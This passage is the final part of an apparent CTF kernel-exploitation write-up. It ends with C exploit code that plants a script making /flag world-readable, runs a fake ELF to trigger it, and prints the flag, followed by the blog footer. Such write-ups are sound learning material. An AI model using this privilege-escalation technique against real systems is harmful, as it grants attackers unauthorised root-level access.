+</span></span><span style=display:flex><span>	system(<span style=color:#4070a0>&#34;echo &#39;chmod 777 /flag&#39; &gt;&gt; /tmp/get_flag.sh&#34;</span>);
+</span></span><span style=display:flex><span>	system(<span style=color:#4070a0>&#34;chmod +x /tmp/get_flag.sh&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	system(<span style=color:#4070a0>&#34;echo -e &#39;</span><span style=color:#4070a0;font-weight:700>\\</span><span style=color:#4070a0>xFF</span><span style=color:#4070a0;font-weight:700>\\</span><span style=color:#4070a0>xFF</span><span style=color:#4070a0;font-weight:700>\\</span><span style=color:#4070a0>xFF</span><span style=color:#4070a0;font-weight:700>\\</span><span style=color:#4070a0>xFF&#39; &gt; /tmp/fake_elf&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	system(<span style=color:#4070a0>&#34;chmod +x /tmp/fake_elf&#34;</span>);
+</span></span><span style=display:flex><span>	system(<span style=color:#4070a0>&#34;/tmp/fake_elf&#34;</span>);
+</span></span><span style=display:flex><span>	system(<span style=color:#4070a0>&#34;cat /flag&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>while</span>(<span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>; 
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li><li><a href=/tags/kernel-pwn>kernel-pwn</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
